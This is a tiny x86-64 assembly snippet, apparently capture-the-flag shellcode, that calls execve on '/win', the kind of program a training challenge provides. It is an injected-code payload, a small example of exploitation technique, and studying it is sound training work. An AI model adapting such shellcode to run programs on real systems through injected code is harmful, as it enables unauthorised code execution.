[BITS 64]
lea rdi, [rel win]
mov al,59
syscall

win:
db "/win",0
